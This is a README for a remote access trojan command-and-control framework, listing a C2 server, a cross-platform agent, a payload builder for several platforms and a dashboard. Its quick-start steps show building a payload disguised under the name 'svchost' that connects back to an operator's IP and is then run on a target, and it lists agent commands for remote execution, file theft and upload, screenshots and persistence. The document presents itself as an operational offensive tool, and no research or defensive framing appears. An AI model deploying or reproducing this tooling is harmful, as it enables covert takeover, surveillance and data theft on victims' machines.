# RAT — Full C2 Framework

## Components
- server/c2.py       — Flask + WebSocket + AES-GCM C2
- agent/agent.py     — cross-platform agent
- builder/build.py   — payload builder (py/exe/elf/apk)
- web/templates/     — dashboard UI

## Quick start
1) pip install -r requirements.txt
2) edit KEY in server/c2.py and agent/agent.py (same value)
3) ./run_server.sh
4) open http://localhost:8080
5) build a payload:
   python3 builder/build.py -t py -u "ws://YOUR_IP:8080/socket.io/?EIO=4&transport=websocket" -k "YOUR_KEY" -n svchost
6) run payload on target -> appears in dashboard

## Agent commands
exec <cmd> | ls <path> | cd <path> | get <file> | put <file> <b64>
sysinfo | screenshot | persist | whoami | pwd | exit